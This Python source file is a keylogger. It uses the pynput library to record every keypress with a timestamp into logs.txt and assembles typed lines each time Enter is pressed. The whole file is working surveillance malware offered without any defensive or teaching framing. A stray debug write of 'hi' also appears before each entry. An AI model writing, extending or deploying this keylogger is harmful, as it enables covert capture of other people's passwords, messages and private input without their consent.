from pynput.keyboard import Key, Listener
from datetime import datetime

captured = []
file_name = "logs.txt"


#
# makes key listener and concatenates it to the main thread
#
def listen():
    with Listener(on_press=press_action) as key_listener:
        key_listener.join()


def press_action(key):
    if key == Key.enter:
        capture("[Enter]", True)
    elif key == Key.backspace:
        if len(captured) > 0:
            captured.pop()
    else:
        capture(str(key).replace('\'', '', 2), False)


def capture(key, finalize):
    file = open(file_name, "a")
    file.write("hi")
    captured.append(key)
    file.write(str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + " " * 5 + key + "\n")
    if finalize:
        line = ""
        for letter in captured:
            line += " " + letter
        file.write(line + "\n")
        file.write("_" * 50 + "\n")
        captured.clear()


def main():
    listen()


if __name__ == "__main__":
    main()
